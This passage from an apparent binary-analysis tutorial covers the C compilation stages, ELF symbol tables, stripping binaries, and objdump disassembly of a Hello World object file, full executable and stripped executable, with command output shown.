#include &lt;errno.h&gt;
#include &lt;fcntl.h&gt;

int main(int argc, char **argv){
    char buf[1024];
    ssize_t ret;
    int fd;
    if(argc == 2){
        fd = open(argv[1], O_CREAT | O_TRUNC | O_RDWR, S_IRUSR | S_IWUSR);
        if(fd == -1){
            if(errno == EACCES) perror(&quot;open&quot;);
            exit(EXIT_FAILURE);
        }
    } else {
        fd = 1;
    }
    while((ret = read(0, buf, 1024-1)) != 0){
        if(ret == -1){
            if(errno == EINTR){
                continue;
            }
            perror(&quot;read&quot;);
            break;
        }
        ret = write(fd, buf, ret);
        if(ret == -1){
            perror(&quot;write&quot;);
            break;
        }
    }

    return 0;
}
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="the-c-compilation-process"><a class="header" href="#the-c-compilation-process">The C Compilation Process</a></h1>
<p>Binaries goes through a process called <em>compilation</em>, which is the process of translating human readable source code, such as C or C++, into machine code that your processor can execute.</p>
<h4 id="1---preprocessing"><a class="header" href="#1---preprocessing">1 - Preprocessing</a></h4>
<p>Includes are included inside the main source file (library code), same thing with other header files and source files, macros definitions in code are replaced with the value of the macro instead of the name of this one, therefore any macros should lose it's symbolic name after preprocessing.</p>
<h4 id="2---compilation"><a class="header" href="#2---compilation">2 - Compilation</a></h4>
<p>When preprocessing is done, the source is ready to be compiled. Compilations consists of taking C/C++ source code and transforming it into assembly. (Most compilers also perform heavy optimization in this phase).</p>
<h4 id="3---assembly-phase"><a class="header" href="#3---assembly-phase">3 - Assembly Phase</a></h4>
<p>After compilation of our code into assembly, it's time to transform it into machine code. The input of the assembly phase is the set of assembly language files generated in the compilation phase, and the output is a set of <em>object files</em>, sometimes also referred to as <em>modules</em>. Object files contains machine instructions that are in principle executable by the processor.</p>
<p>GCC can be used to generate object files instead of ELF executable, this is easily done using the -c switch.</p>
<pre><code>$ gcc -c source.c
$ file source.o
source.o: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), not stripped
</code></pre>
<p>What does <em>Relocatable</em> means ? Relocatable files don't rely on being placed at any particular address in memory; rather, they can be moved around at will without breaking any assumptions in the code. When you see the term <em>relocatable</em> in the <em>file</em> output, you know you are dealing with an object file and not an executable.</p>
<p>Object files are compiled independently from each other, so the assembler has no way of knowing the memory addresses of other object files when assembling an object file. That's why object files need to be relocatable; that way, you can link them together in any order to form a complete binary executable. If object files were not relocatable, this would not be possible.</p>
<h4 id="4---linking"><a class="header" href="#4---linking">4 - Linking</a></h4>
<p>The linking phase is the last and final phase of the ELF compilation process, this phase is responsible for linking all the generated object files from the last phase into a single ELF executable, in modern systems, the linking phase sometimes incorporates an additional optimization pass, called <em>link-time optimization (LTO).</em></p>
<p>The program responsible for linking the obect files is called the <em>linker</em>. It's typically seperate from the compiler.</p>
<p>Object files are relocatable because they are compiled independently from each other, preventing the compiler from assuming that an object will end up at any particular base address. Moreover, object files may reference functions or variables in other object files or in libraries that are external to the program (example libc). Before the linking phase the addresses at which the referenced code and data will be placed are not yet known, so the object files only contain <em>relocation symbols</em> that specify how function and variable references should eventually be resolved. In the context of linking, references that rely on a relocation are called <em>symbolic references</em>.</p>
<p>The linker's job is to take all the object files belonging to a program and merge them into a single coherent executable, typically intended to be loaded at a particular memory address. Now that the arrangement of all modules in the executable is known, the linker can resolve most symbolic references. References to libraries may or may not be completely resolved, depending on the type of library.</p>
<p>Static libraries (which on linux typically have the extension .a) are merged into the binary executable, allowing any references to them to be resolved entirely. There are also dynamic (shared) libraries, which are shared in memory among all programs that run on a system. In other words, rather than copying all the library into every binary that uses it, dynamic libraries are loaded into memory only once, and any binary that wants to use the library needs to use this shared copy. During the linking phase, the addresses at which dynamic libraries will reside are not yet known, so references to them cannot be resolved. Instead the linker leaves symbolic references to these libraries even in the final executable and these references are not resolved until the binary is actually loaded into memory to be executed.</p>
<p>You can see which dynamic linker and shared libraries will be used by your executable by running the ldd command on it (works only with dynamically linked libraries).</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="symbols-and-stripped-binaries"><a class="header" href="#symbols-and-stripped-binaries">Symbols and Stripped Binaries</a></h1>
<p>When compiling a program, compilers emits <em>symbols</em>, which keep track of such symbolic names and record which binary code and data correspond to each symbol.</p>
<h2 id="viewing-symbolic-information"><a class="header" href="#viewing-symbolic-information">Viewing Symbolic Information</a></h2>
<p>Let's use readelf and show what symbols looks like in a binary, for this i programmed a simple C program, which is the following.</p>
<pre><code class="language-c">// Compile with gcc simple.c -o simple
#include &lt;stdio.h&gt;

void HelloWorld(){
	printf(&quot;Hello World !&quot;);
}


int main(int argc, char** argv, char** envp){
	HelloWorld();
	return 0;
}
</code></pre>
<p>Then we can extract the symbols with readelf like i previously said.</p>
<pre><code>$ readelf --syms simple
Symbol table '.dynsym' contains 7 entries:
   Num:    Value          Size Type    Bind   Vis      Ndx Name
     0: 0000000000000000     0 NOTYPE  LOCAL  DEFAULT  UND 
     1: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_deregisterT[...]
     2: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (2)
     3: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (2)
     4: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__
     5: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_registerTMC[...]
     6: 0000000000000000     0 FUNC    WEAK   DEFAULT  UND [...]@GLIBC_2.2.5 (2)

Symbol table '.symtab' contains 42 entries:
   Num:    Value          Size Type    Bind   Vis      Ndx Name
     0: 0000000000000000     0 NOTYPE  LOCAL  DEFAULT  UND 
     1: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS abi-note.c
     2: 000000000000039c    32 OBJECT  LOCAL  DEFAULT    4 __abi_tag
     3: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS init.c
     4: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS crtstuff.c
     5: 0000000000001070     0 FUNC    LOCAL  DEFAULT   14 deregister_tm_clones
     6: 00000000000010a0     0 FUNC    LOCAL  DEFAULT   14 register_tm_clones
     7: 00000000000010e0     0 FUNC    LOCAL  DEFAULT   14 __do_global_dtors_aux
     8: 0000000000004030     1 OBJECT  LOCAL  DEFAULT   25 completed.0
     9: 0000000000003df0     0 OBJECT  LOCAL  DEFAULT   20 __do_global_dtor[...]
    10: 0000000000001130     0 FUNC    LOCAL  DEFAULT   14 frame_dummy
    11: 0000000000003de8     0 OBJECT  LOCAL  DEFAULT   19 __frame_dummy_in[...]
    12: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS simple.c
    13: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS crtstuff.c
    14: 0000000000002144     0 OBJECT  LOCAL  DEFAULT   18 __FRAME_END__
    15: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS 
    16: 0000000000003df0     0 NOTYPE  LOCAL  DEFAULT   19 __init_array_end
    17: 0000000000003df8     0 OBJECT  LOCAL  DEFAULT   21 _DYNAMIC
    18: 0000000000003de8     0 NOTYPE  LOCAL  DEFAULT   19 __init_array_start
    19: 0000000000002014     0 NOTYPE  LOCAL  DEFAULT   17 __GNU_EH_FRAME_HDR
    20: 0000000000004000     0 OBJECT  LOCAL  DEFAULT   23 _GLOBAL_OFFSET_TABLE_
    21: 0000000000001000     0 FUNC    LOCAL  DEFAULT   12 _init
    22: 00000000000011f0     5 FUNC    GLOBAL DEFAULT   14 __libc_csu_fini
    23: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_deregisterT[...]
    24: 0000000000004020     0 NOTYPE  WEAK   DEFAULT   24 data_start
    25: 0000000000001139    27 FUNC    GLOBAL DEFAULT   14 HelloWorld
    26: 0000000000004030     0 NOTYPE  GLOBAL DEFAULT   24 _edata
    27: 00000000000011f8     0 FUNC    GLOBAL HIDDEN    15 _fini
    28: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND printf@GLIBC_2.2.5
    29: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_mai[...]
    30: 0000000000004020     0 NOTYPE  GLOBAL DEFAULT   24 __data_start
    31: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__
    32: 0000000000004028     0 OBJECT  GLOBAL HIDDEN    24 __dso_handle
    33: 0000000000002000     4 OBJECT  GLOBAL DEFAULT   16 _IO_stdin_used
    34: 0000000000001180   101 FUNC    GLOBAL DEFAULT   14 __libc_csu_init
    35: 0000000000004038     0 NOTYPE  GLOBAL DEFAULT   25 _end
    36: 0000000000001040    47 FUNC    GLOBAL DEFAULT   14 _start
    37: 0000000000004030     0 NOTYPE  GLOBAL DEFAULT   25 __bss_start
    38: 0000000000001154    36 FUNC    GLOBAL DEFAULT   14 main
    39: 0000000000004030     0 OBJECT  GLOBAL HIDDEN    24 __TMC_END__
    40: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_registerTMC[...]
    41: 0000000000000000     0 FUNC    WEAK   DEFAULT  UND __cxa_finalize@G[...]
</code></pre>
<p>You can notice the symbol for the main function, it specify address 0x1154 at which main will reside when the binary is loaded into memory, you can also notice the size of the function in bytes, in this case the main function is 36 bytes long and that you're dealing with a function symbol (FUNC).</p>
<p>For ELF binaries, debugging symbols are typically generated in the DWARF format, while PE binaries usually use the proprietary Microsoft Portable Debugging (PDB) format. DWARF information is usually embedded within the binary, while PDB comes in the form of a separate symbol file.</p>
<p>Symbolic information is extremely useful for binary analysis, having access to functions symbol makes your analysis much more easier, this makes it much less likely that you'll accidentally disassemble data as code.</p>
<p>You can parse symbols with readelf, or programatically with a library like libbfd (we'll see it later), there are also libraries like libdwarf specifically designed for parsing DWARD debug symbols, but i won't cover them in this book.</p>
<h2 id="stripping-a-binary"><a class="header" href="#stripping-a-binary">Stripping a Binary</a></h2>
<p>By default, gcc does not strip binaries, however stripping a binary is as easy as it gets, the most common way to strip a binary is by using the <em>strip</em> binary that is included on most linux installations, you can strip a binary the following way.</p>
<pre><code>$ strip --strip-all ./simple
</code></pre>
<p>Then we can use the <em>file</em> utility that also comes with most linux installations and see the output of this command.</p>
<pre><code>$ file ./simple
simple: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=2ff7abe06262630a9605e5580736cc5132eb5d25, for GNU/Linux 4.4.0, stripped
</code></pre>
<p>Notice how the file utility now says that the binary is stripped, well it in fact is stripped, let's now have some more fun and look at the symbols in the binary.</p>
<pre><code>$ readelf --syms ./simple
Symbol table '.dynsym' contains 7 entries:
   Num:    Value          Size Type    Bind   Vis      Ndx Name
     0: 0000000000000000     0 NOTYPE  LOCAL  DEFAULT  UND 
     1: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_deregisterT[...]
     2: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (2)
     3: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (2)
     4: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__
     5: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_registerTMC[...]
     6: 0000000000000000     0 FUNC    WEAK   DEFAULT  UND [...]@GLIBC_2.2.5 (2)
</code></pre>
<p>Our previously had 42 entries in the .symtab (symbol table), now the table is completely empty and contains no more symbolic information, note that the .dynsym table hasn't changed.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="disassembling-a-binary"><a class="header" href="#disassembling-a-binary">Disassembling a Binary</a></h1>
<p>Now that we wen't through the compilation process and a little bit into symbolic informations inside binaries, we can start trying to disassemble an executable and see how it differs from an object file.</p>
<h2 id="looking-inside-an-object-file"><a class="header" href="#looking-inside-an-object-file">Looking inside an Object File</a></h2>
<p>For this we will use the <em>objdump</em> utility for linux, it's a simple, easy-to-use disassembler included with most linux distributions.</p>
<pre><code>$ objdump -sj .rodata simple.o
simple.o:     file format elf64-x86-64

Contents of section .rodata:
 0000 48656c6c 6f20576f 726c6420 2100      Hello World !.  
 
$ objdump -M intel -d simple.o
simple.o:     file format elf64-x86-64
Disassembly of section .text:

0000000000000000 &lt;HelloWorld&gt;:
   0:   55                      push   rbp
   1:   48 89 e5                mov    rbp,rsp
   4:   48 8d 05 00 00 00 00    lea    rax,[rip+0x0]        # b &lt;HelloWorld+0xb&gt;
   b:   48 89 c7                mov    rdi,rax
   e:   b8 00 00 00 00          mov    eax,0x0
  13:   e8 00 00 00 00          call   18 &lt;HelloWorld+0x18&gt;
  18:   90                      nop
  19:   5d                      pop    rbp
  1a:   c3                      ret    

000000000000001b &lt;main&gt;:
  1b:   55                      push   rbp
  1c:   48 89 e5                mov    rbp,rsp
  1f:   48 83 ec 20             sub    rsp,0x20
  23:   89 7d fc                mov    DWORD PTR [rbp-0x4],edi
  26:   48 89 75 f0             mov    QWORD PTR [rbp-0x10],rsi
  2a:   48 89 55 e8             mov    QWORD PTR [rbp-0x18],rdx
  2e:   b8 00 00 00 00          mov    eax,0x0
  33:   e8 00 00 00 00          call   38 &lt;main+0x1d&gt;
  38:   b8 00 00 00 00          mov    eax,0x0
  3d:   c9                      leave  
  3e:   c3                      ret 
</code></pre>
<p>The first time we called objdump we are asking for the content of the .rodata (read only data) section, in our case we have only &quot;Hello World !&quot; which is a string constant.</p>
<p>The contents of .rodata consist of an ASCII encoding of the string, shown on the left side of the output, on the right side you can see the human representation of those bytes.</p>
<p>The second call to objdump disassembles all the code of the functions inside our binary, the output conforms pretty closely to the assembly code previously produced by the compilation phase.</p>
<p>Note that the offsets in an object file doesn't really make sense, like the call to the HelloWorld function or the pointer to the string &quot;Hello World&quot; in the function HelloWorld supposedly at <code>[rip+0x0]</code> which doesn't really make any sense, this happens because data and code references from obejct files are not yet fully resolved because the compiler doesn't know at what base address the file will eventually be loaded. The object file is waiting for the linker to fill in the correct value for this reference.</p>
<p>You can confirm this by asking readelf to show you all the relocation symbols present in the object file.</p>
<pre><code>$ readelf --relocs simple.o
Relocation section '.rela.text' at offset 0x220 contains 3 entries:
  Offset          Info           Type           Sym. Value    Sym. Name + Addend
000000000007  000300000002 R_X86_64_PC32     0000000000000000 .rodata - 4
000000000014  000600000004 R_X86_64_PLT32    0000000000000000 printf - 4
000000000034  000400000004 R_X86_64_PLT32    0000000000000000 HelloWorld - 4
...
</code></pre>
<p>The relocation <code>.rodata - 4</code> tells the linker that it should resolve the reference to the string to point to whatever address it ends up at in the <code>.rodata</code> section.</p>
<p>The relocation <code>printf - 4</code> is telling the linker how to resolve the call to puts, same thing with <code>HelloWorld - 4</code>.</p>
<h2 id="examining-a-complete-binary-executable"><a class="header" href="#examining-a-complete-binary-executable">Examining a Complete Binary Executable</a></h2>
<p>Now that you've seen the innards of an object file, it's time to disassemble a complete binary. We will first disassembler a regular binary and after we will disassemble a stripped one, this should make it easier for us to see the difference between both.</p>
<pre><code class="language-x86asm">$ objdump -M intel -d simple
simple:     file format elf64-x86-64


Disassembly of section .init:

0000000000001000 &lt;_init&gt;:
    1000:       f3 0f 1e fa             endbr64 
    1004:       48 83 ec 08             sub    rsp,0x8
    1008:       48 8b 05 d9 2f 00 00    mov    rax,QWORD PTR [rip+0x2fd9]        # 3fe8 &lt;__gmon_start__&gt;
    100f:       48 85 c0                test   rax,rax
    1012:       74 02                   je     1016 &lt;_init+0x16&gt;
    1014:       ff d0                   call   rax
    1016:       48 83 c4 08             add    rsp,0x8
    101a:       c3                      ret    

Disassembly of section .plt:

0000000000001020 &lt;printf@plt-0x10&gt;:
    1020:       ff 35 e2 2f 00 00       push   QWORD PTR [rip+0x2fe2]        # 4008 &lt;_GLOBAL_OFFSET_TABLE_+0x8&gt;
    1026:       ff 25 e4 2f 00 00       jmp    QWORD PTR [rip+0x2fe4]        # 4010 &lt;_GLOBAL_OFFSET_TABLE_+0x10&gt;
    102c:       0f 1f 40 00             nop    DWORD PTR [rax+0x0]

0000000000001030 &lt;printf@plt&gt;:
    1030:       ff 25 e2 2f 00 00       jmp    QWORD PTR [rip+0x2fe2]        # 4018 &lt;printf@GLIBC_2.2.5&gt;
    1036:       68 00 00 00 00          push   0x0
    103b:       e9 e0 ff ff ff          jmp    1020 &lt;_init+0x20&gt;

Disassembly of section .text:

0000000000001040 &lt;_start&gt;:
    1040:       f3 0f 1e fa             endbr64 
    1044:       31 ed                   xor    ebp,ebp
    1046:       49 89 d1                mov    r9,rdx
    1049:       5e                      pop    rsi
    104a:       48 89 e2                mov    rdx,rsp
    104d:       48 83 e4 f0             and    rsp,0xfffffffffffffff0
    1051:       50                      push   rax
    1052:       54                      push   rsp
    1053:       4c 8d 05 96 01 00 00    lea    r8,[rip+0x196]        # 11f0 &lt;__libc_csu_fini&gt;
    105a:       48 8d 0d 1f 01 00 00    lea    rcx,[rip+0x11f]        # 1180 &lt;__libc_csu_init&gt;
    1061:       48 8d 3d ec 00 00 00    lea    rdi,[rip+0xec]        # 1154 &lt;main&gt;
    1068:       ff 15 72 2f 00 00       call   QWORD PTR [rip+0x2f72]        # 3fe0 &lt;__libc_start_main@GLIBC_2.2.5&gt;
    106e:       f4                      hlt    
    106f:       90                      nop

0000000000001070 &lt;deregister_tm_clones&gt;:
    1070:       48 8d 3d b9 2f 00 00    lea    rdi,[rip+0x2fb9]        # 4030 &lt;__TMC_END__&gt;
    1077:       48 8d 05 b2 2f 00 00    lea    rax,[rip+0x2fb2]        # 4030 &lt;__TMC_END__&gt;
    107e:       48 39 f8                cmp    rax,rdi
    1081:       74 15                   je     1098 &lt;deregister_tm_clones+0x28&gt;
    1083:       48 8b 05 4e 2f 00 00    mov    rax,QWORD PTR [rip+0x2f4e]        # 3fd8 &lt;_ITM_deregisterTMCloneTable&gt;
    108a:       48 85 c0                test   rax,rax
    108d:       74 09                   je     1098 &lt;deregister_tm_clones+0x28&gt;
    108f:       ff e0                   jmp    rax
    1091:       0f 1f 80 00 00 00 00    nop    DWORD PTR [rax+0x0]
    1098:       c3                      ret    
    1099:       0f 1f 80 00 00 00 00    nop    DWORD PTR [rax+0x0]

00000000000010a0 &lt;register_tm_clones&gt;:
    10a0:       48 8d 3d 89 2f 00 00    lea    rdi,[rip+0x2f89]        # 4030 &lt;__TMC_END__&gt;
    10a7:       48 8d 35 82 2f 00 00    lea    rsi,[rip+0x2f82]        # 4030 &lt;__TMC_END__&gt;
    10ae:       48 29 fe                sub    rsi,rdi
    10b1:       48 89 f0                mov    rax,rsi
    10b4:       48 c1 ee 3f             shr    rsi,0x3f
    10b8:       48 c1 f8 03             sar    rax,0x3
    10bc:       48 01 c6                add    rsi,rax
    10bf:       48 d1 fe                sar    rsi,1
    10c2:       74 14                   je     10d8 &lt;register_tm_clones+0x38&gt;
    10c4:       48 8b 05 25 2f 00 00    mov    rax,QWORD PTR [rip+0x2f25]        # 3ff0 &lt;_ITM_registerTMCloneTable&gt;
    10cb:       48 85 c0                test   rax,rax
    10ce:       74 08                   je     10d8 &lt;register_tm_clones+0x38&gt;
    10d0:       ff e0                   jmp    rax
    10d2:       66 0f 1f 44 00 00       nop    WORD PTR [rax+rax*1+0x0]
    10d8:       c3                      ret    
    10d9:       0f 1f 80 00 00 00 00    nop    DWORD PTR [rax+0x0]

00000000000010e0 &lt;__do_global_dtors_aux&gt;:
    10e0:       f3 0f 1e fa             endbr64 
    10e4:       80 3d 45 2f 00 00 00    cmp    BYTE PTR [rip+0x2f45],0x0        # 4030 &lt;__TMC_END__&gt;
    10eb:       75 33                   jne    1120 &lt;__do_global_dtors_aux+0x40&gt;
    10ed:       55                      push   rbp
    10ee:       48 83 3d 02 2f 00 00    cmp    QWORD PTR [rip+0x2f02],0x0        # 3ff8 &lt;__cxa_finalize@GLIBC_2.2.5&gt;
    10f5:       00 
    10f6:       48 89 e5                mov    rbp,rsp
    10f9:       74 0d                   je     1108 &lt;__do_global_dtors_aux+0x28&gt;
    10fb:       48 8b 3d 26 2f 00 00    mov    rdi,QWORD PTR [rip+0x2f26]        # 4028 &lt;__dso_handle&gt;
    1102:       ff 15 f0 2e 00 00       call   QWORD PTR [rip+0x2ef0]        # 3ff8 &lt;__cxa_finalize@GLIBC_2.2.5&gt;
    1108:       e8 63 ff ff ff          call   1070 &lt;deregister_tm_clones&gt;
    110d:       c6 05 1c 2f 00 00 01    mov    BYTE PTR [rip+0x2f1c],0x1        # 4030 &lt;__TMC_END__&gt;
    1114:       5d                      pop    rbp
    1115:       c3                      ret    
    1116:       66 2e 0f 1f 84 00 00    cs nop WORD PTR [rax+rax*1+0x0]
    111d:       00 00 00 
    1120:       c3                      ret    
    1121:       66 66 2e 0f 1f 84 00    data16 cs nop WORD PTR [rax+rax*1+0x0]
    1128:       00 00 00 00 
    112c:       0f 1f 40 00             nop    DWORD PTR [rax+0x0]

0000000000001130 &lt;frame_dummy&gt;:
    1130:       f3 0f 1e fa             endbr64 
    1134:       e9 67 ff ff ff          jmp    10a0 &lt;register_tm_clones&gt;

0000000000001139 &lt;HelloWorld&gt;:
    1139:       55                      push   rbp
    113a:       48 89 e5                mov    rbp,rsp
    113d:       48 8d 05 c0 0e 00 00    lea    rax,[rip+0xec0]        # 2004 &lt;_IO_stdin_used+0x4&gt;
    1144:       48 89 c7                mov    rdi,rax
    1147:       b8 00 00 00 00          mov    eax,0x0
    114c:       e8 df fe ff ff          call   1030 &lt;printf@plt&gt;
    1151:       90                      nop
    1152:       5d                      pop    rbp
    1153:       c3                      ret    

0000000000001154 &lt;main&gt;:
    1154:       55                      push   rbp
    1155:       48 89 e5                mov    rbp,rsp
    1158:       48 83 ec 20             sub    rsp,0x20
    115c:       89 7d fc                mov    DWORD PTR [rbp-0x4],edi
    115f:       48 89 75 f0             mov    QWORD PTR [rbp-0x10],rsi
    1163:       48 89 55 e8             mov    QWORD PTR [rbp-0x18],rdx
    1167:       b8 00 00 00 00          mov    eax,0x0
    116c:       e8 c8 ff ff ff          call   1139 &lt;HelloWorld&gt;
    1171:       b8 00 00 00 00          mov    eax,0x0
    1176:       c9                      leave  
    1177:       c3                      ret    
    1178:       0f 1f 84 00 00 00 00    nop    DWORD PTR [rax+rax*1+0x0]
    117f:       00 

0000000000001180 &lt;__libc_csu_init&gt;:
    1180:       f3 0f 1e fa             endbr64 
    1184:       41 57                   push   r15
    1186:       4c 8d 3d 5b 2c 00 00    lea    r15,[rip+0x2c5b]        # 3de8 &lt;__frame_dummy_init_array_entry&gt;
    118d:       41 56                   push   r14
    118f:       49 89 d6                mov    r14,rdx
    1192:       41 55                   push   r13
    1194:       49 89 f5                mov    r13,rsi
    1197:       41 54                   push   r12
    1199:       41 89 fc                mov    r12d,edi
    119c:       55                      push   rbp
    119d:       48 8d 2d 4c 2c 00 00    lea    rbp,[rip+0x2c4c]        # 3df0 &lt;__do_global_dtors_aux_fini_array_entry&gt;
    11a4:       53                      push   rbx
    11a5:       4c 29 fd                sub    rbp,r15
    11a8:       48 83 ec 08             sub    rsp,0x8
    11ac:       e8 4f fe ff ff          call   1000 &lt;_init&gt;
    11b1:       48 c1 fd 03             sar    rbp,0x3
    11b5:       74 1f                   je     11d6 &lt;__libc_csu_init+0x56&gt;
    11b7:       31 db                   xor    ebx,ebx
    11b9:       0f 1f 80 00 00 00 00    nop    DWORD PTR [rax+0x0]
    11c0:       4c 89 f2                mov    rdx,r14
    11c3:       4c 89 ee                mov    rsi,r13
    11c6:       44 89 e7                mov    edi,r12d
    11c9:       41 ff 14 df             call   QWORD PTR [r15+rbx*8]
    11cd:       48 83 c3 01             add    rbx,0x1
    11d1:       48 39 dd                cmp    rbp,rbx
    11d4:       75 ea                   jne    11c0 &lt;__libc_csu_init+0x40&gt;
    11d6:       48 83 c4 08             add    rsp,0x8
    11da:       5b                      pop    rbx
    11db:       5d                      pop    rbp
    11dc:       41 5c                   pop    r12
    11de:       41 5d                   pop    r13
    11e0:       41 5e                   pop    r14
    11e2:       41 5f                   pop    r15
    11e4:       c3                      ret    
    11e5:       66 66 2e 0f 1f 84 00    data16 cs nop WORD PTR [rax+rax*1+0x0]
    11ec:       00 00 00 00 

00000000000011f0 &lt;__libc_csu_fini&gt;:
    11f0:       f3 0f 1e fa             endbr64 
    11f4:       c3                      ret    

Disassembly of section .fini:

00000000000011f8 &lt;_fini&gt;:
    11f8:       f3 0f 1e fa             endbr64 
    11fc:       48 83 ec 08             sub    rsp,0x8
    1200:       48 83 c4 08             add    rsp,0x8
    1204:       c3                      ret   
</code></pre>
<p>There is a lot more code in the binary than the object file, it's not longer just our 2 functions. There are multiple sections now, with names like <code>.init</code>, <code>.plt</code> and <code>.text</code>. These sections all contain code serving different functions, such as program initialization or stubs for calling shared libraries.</p>
<h3 id="text-section"><a class="header" href="#text-section">.text section</a></h3>
<p>contains the <code>main code section</code>, this is where the <code>main function should reside</code>. It also <code>contains a number of other functions, such as \_start</code>, that are <strong>responsible for tasks such as setting up the command line arguments and runtime environment for main and cleaning up after main</strong>. These extra functions are standard functions, <strong>present in any ELF binary produced by gcc</strong>. </p>
<p>You can also see that the previously incomplete code and data references have now been resolved by the linker. For instance, the call to <code>HelloWorld</code> is properly resolved and <code>printf</code> points to the proper stub (<strong>in the .plt section</strong>) for the shared library that contain puts (<strong>libc</strong>).</p>
<p>The binary might contains a whole lot of other functions and code but it is still pretty much the same thing we reversed in our object file, this will change when we will strip the binary.</p>
<pre><code class="language-x86asm">$ objdump -M intel -d simple.stripped
simple.stripped:     file format elf64-x86-64


Disassembly of section .init:

0000000000001000 &lt;.init&gt;:
    1000:       f3 0f 1e fa             endbr64 
    1004:       48 83 ec 08             sub    rsp,0x8
    1008:       48 8b 05 d9 2f 00 00    mov    rax,QWORD PTR [rip+0x2fd9]        # 3fe8 &lt;printf@plt+0x2fb8&gt;
    100f:       48 85 c0                test   rax,rax
    1012:       74 02                   je     1016 &lt;printf@plt-0x1a&gt;
    1014:       ff d0                   call   rax
    1016:       48 83 c4 08             add    rsp,0x8
    101a:       c3                      ret    

Disassembly of section .plt:

0000000000001020 &lt;printf@plt-0x10&gt;:
    1020:       ff 35 e2 2f 00 00       push   QWORD PTR [rip+0x2fe2]        # 4008 &lt;printf@plt+0x2fd8&gt;
    1026:       ff 25 e4 2f 00 00       jmp    QWORD PTR [rip+0x2fe4]        # 4010 &lt;printf@plt+0x2fe0&gt;
    102c:       0f 1f 40 00             nop    DWORD PTR [rax+0x0]

0000000000001030 &lt;printf@plt&gt;:
    1030:       ff 25 e2 2f 00 00       jmp    QWORD PTR [rip+0x2fe2]        # 4018 &lt;printf@plt+0x2fe8&gt;
    1036:       68 00 00 00 00          push   0x0
    103b:       e9 e0 ff ff ff          jmp    1020 &lt;printf@plt-0x10&gt;

Disassembly of section .text:

0000000000001040 &lt;.text&gt;:
    1040:       f3 0f 1e fa             endbr64 
    1044:       31 ed                   xor    ebp,ebp
    1046:       49 89 d1                mov    r9,rdx
    1049:       5e                      pop    rsi
    104a:       48 89 e2                mov    rdx,rsp
    104d:       48 83 e4 f0             and    rsp,0xfffffffffffffff0
    1051:       50                      push   rax
    1052:       54                      push   rsp
    1053:       4c 8d 05 96 01 00 00    lea    r8,[rip+0x196]        # 11f0 &lt;printf@plt+0x1c0&gt;
    105a:       48 8d 0d 1f 01 00 00    lea    rcx,[rip+0x11f]        # 1180 &lt;printf@plt+0x150&gt;
    1061:       48 8d 3d ec 00 00 00    lea    rdi,[rip+0xec]        # 1154 &lt;printf@plt+0x124&gt;
    1068:       ff 15 72 2f 00 00       call   QWORD PTR [rip+0x2f72]        # 3fe0 &lt;printf@plt+0x2fb0&gt;
    106e:       f4                      hlt    
    106f:       90                      nop
    1070:       48 8d 3d b9 2f 00 00    lea    rdi,[rip+0x2fb9]        # 4030 &lt;printf@plt+0x3000&gt;
    1077:       48 8d 05 b2 2f 00 00    lea    rax,[rip+0x2fb2]        # 4030 &lt;printf@plt+0x3000&gt;
    107e:       48 39 f8                cmp    rax,rdi
    1081:       74 15                   je     1098 &lt;printf@plt+0x68&gt;
    1083:       48 8b 05 4e 2f 00 00    mov    rax,QWORD PTR [rip+0x2f4e]        # 3fd8 &lt;printf@plt+0x2fa8&gt;
    108a:       48 85 c0                test   rax,rax
    108d:       74 09                   je     1098 &lt;printf@plt+0x68&gt;
    108f:       ff e0                   jmp    rax
    1091:       0f 1f 80 00 00 00 00    nop    DWORD PTR [rax+0x0]
    1098:       c3                      ret    
    1099:       0f 1f 80 00 00 00 00    nop    DWORD PTR [rax+0x0]
    10a0:       48 8d 3d 89 2f 00 00    lea    rdi,[rip+0x2f89]        # 4030 &lt;printf@plt+0x3000&gt;
    10a7:       48 8d 35 82 2f 00 00    lea    rsi,[rip+0x2f82]        # 4030 &lt;printf@plt+0x3000&gt;
    10ae:       48 29 fe                sub    rsi,rdi
    10b1:       48 89 f0                mov    rax,rsi
    10b4:       48 c1 ee 3f             shr    rsi,0x3f
    10b8:       48 c1 f8 03             sar    rax,0x3
    10bc:       48 01 c6                add    rsi,rax
    10bf:       48 d1 fe                sar    rsi,1
    10c2:       74 14                   je     10d8 &lt;printf@plt+0xa8&gt;
    10c4:       48 8b 05 25 2f 00 00    mov    rax,QWORD PTR [rip+0x2f25]        # 3ff0 &lt;printf@plt+0x2fc0&gt;
    10cb:       48 85 c0                test   rax,rax
    10ce:       74 08                   je     10d8 &lt;printf@plt+0xa8&gt;
    10d0:       ff e0                   jmp    rax
    10d2:       66 0f 1f 44 00 00       nop    WORD PTR [rax+rax*1+0x0]
    10d8:       c3                      ret    
    10d9:       0f 1f 80 00 00 00 00    nop    DWORD PTR [rax+0x0]
    10e0:       f3 0f 1e fa             endbr64 
